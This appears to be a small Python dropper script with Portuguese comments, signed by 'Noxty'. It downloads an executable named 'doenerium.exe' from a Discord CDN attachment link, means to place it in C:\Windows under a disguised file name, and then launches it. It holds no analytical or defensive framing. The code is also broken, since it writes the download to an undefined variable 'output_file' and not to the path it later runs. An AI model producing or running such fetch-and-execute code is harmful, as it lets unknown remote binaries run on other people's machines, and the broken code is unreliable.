### IMPORTS 

import urllib.request
import shutil
import subprocess
import os
from os import system

### CONFIGURAÇÕES 

NoxtyLINK = "https://cdn.discordapp.com/attachments/1093601382906470492/1093606463601135797/doenerium.exe"

NoxtyPATH = "C:\\Windows\\ily builded by noxty.exe"

### CODIGO PRINCIPAL (DOWNLOAD)

with urllib.request.urlopen(NoxtyLINK) as response, open(output_file, 'wb') as out_file:
    shutil.copyfileobj(response, out_file)

### CODIGO SECUNDARIO (INICIALIZAÇÃO) 

subprocess.call(NoxtyPATH)


### CODIGO FEITO POR NOXTY <3